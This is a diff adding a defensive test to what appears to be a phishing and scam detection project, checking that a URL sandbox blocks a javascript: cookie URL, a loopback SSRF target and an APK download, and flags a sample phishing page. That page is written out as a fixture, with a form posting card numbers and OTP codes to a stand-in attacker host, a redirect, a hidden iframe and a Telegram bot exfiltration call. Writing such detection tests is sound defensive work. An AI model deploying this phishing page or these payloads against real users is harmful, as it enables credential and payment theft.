@@ -18,6 +18,7 @@ from saas_sandbox import (  # noqa: E402
     run_sandbox_benchmark,
 )
 from url_inspector import defang_url, inspect_url_forensics, probe_url_live  # noqa: E402
+from url_sandbox import detonate_url_in_sandbox, inspect_html_payload  # noqa: E402
 
 
 # --- 5 Scam Messages ---
@@ -245,6 +246,52 @@ def test_sandbox_benchmark_and_saas_tenants():
             os.remove(temp_db)
 
 
+def test_url_sandbox_detonation_and_guards():
+    # 1. Blocks dangerous javascript: scheme
+    js_res = detonate_url_in_sandbox("javascript:alert(document.cookie)")
+    assert js_res["execution_mode"] == "blocked_unsafe_scheme"
+    assert js_res["verdict"] == "dangerous"
+    assert js_res["safety_guarantees"]["js_executed"] is False
+
+    # 2. Blocks SSRF targeting loopback/LAN
+    ssrf_res = detonate_url_in_sandbox("http://127.0.0.1:8080/internal-admin")
+    assert ssrf_res["execution_mode"] == "blocked_ssrf"
+    assert ssrf_res["verdict"] == "dangerous"
+
+    # 3. Static HTML/JS phishing payload inspection (no execution)
+    phishing_html = """
+    <html><head><title>Rafidain Secure Verify</title>
+    <meta http-equiv="refresh" content="0;url=https://evil-stealer.xyz/done"></head>
+    <body>
+      <form action="https://attacker-collect.top/steal" method="POST">
+        <input type="text" name="card_number" placeholder="Card Number" />
+        <input type="password" name="otp_pin" />
+      </form>
+      <iframe src="https://tracker.xyz/pixel" style="display:none"></iframe>
+      <script>
+        var x = atob("dGVzdA==");
+        fetch("https://api.telegram.org/bot12345/sendMessage");
+      </script>
+    </body></html>
+    """
+    dom = inspect_html_payload(phishing_html, "http://rafidain-verify.xyz/login")
+    assert dom["page_title"] == "Rafidain Secure Verify"
+    assert dom["forms_count"] == 1
+    assert dom["password_inputs"] == 1
+    assert dom["cross_domain_form"] is True
+    assert dom["exfil_webhook_detected"] is True
+    assert dom["obfuscated_js_hits"] >= 1
+    assert dom["hidden_iframes_count"] == 1
+    assert "hxxps://evil-stealer[.]xyz" in (dom["meta_refresh_target"] or "")
+
+    # 4. Predictive offline simulation + APK download detection
+    apk_res = detonate_url_in_sandbox("http://paypa1-secure.xyz/download/security-patch.apk")
+    assert apk_res["verdict"] == "dangerous"
+    ids = {a["id"] for a in apk_res["what_it_tries_to_do"]}
+    assert "drive_by_download" in ids
+    assert "predicted_brand_phish" in ids
+
+
 if __name__ == "__main__":
     tests = [
         test_scam_prize_paypal_otp,
@@ -264,6 +311,7 @@ if __name__ == "__main__":
         test_dlp_scanner_masks_secrets,
         test_blockchain_certificate_chain,
         test_sandbox_benchmark_and_saas_tenants,
+        test_url_sandbox_detonation_and_guards,
     ]
     for fn in tests:
         fn()
